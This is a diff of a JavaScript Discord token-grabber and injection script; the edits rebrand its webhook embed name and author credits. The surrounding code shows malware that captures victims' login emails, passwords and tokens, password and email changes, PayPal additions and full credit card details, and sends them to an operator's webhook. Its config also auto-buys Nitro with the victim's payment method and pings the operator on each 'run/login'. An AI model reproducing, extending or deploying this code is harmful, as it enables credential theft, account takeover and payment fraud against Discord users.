@@ -8,7 +8,7 @@ const config = {
     auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
     ping_on_run: true, //pings @everyone when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-    embed_name: 'TWISTX7 GRABBER', //name of the webhook thats gonna send the info
+    embed_name: 'Thunder', //name of the webhook thats gonna send the info
     embed_icon: 'https://i.imgur.com/A09Lc91.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 5112163, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     webhook: '%WEBHOOK%', //your discord webhook there obviously
@@ -354,7 +354,7 @@ const login = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
@@ -397,7 +397,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
@@ -440,7 +440,7 @@ const emailChanged = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
@@ -482,7 +482,7 @@ const PaypalAdded = async (token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
@@ -524,7 +524,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
@@ -568,7 +568,7 @@ const nitroBought = async (token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Grabber Created By TWISTX7 | Injection Created By Rdimo#6968"
+                    "text": "Grabber Created By TWISTX7#9122 | Injection Created By Rdimo#6968"
                 }
             }
         ]
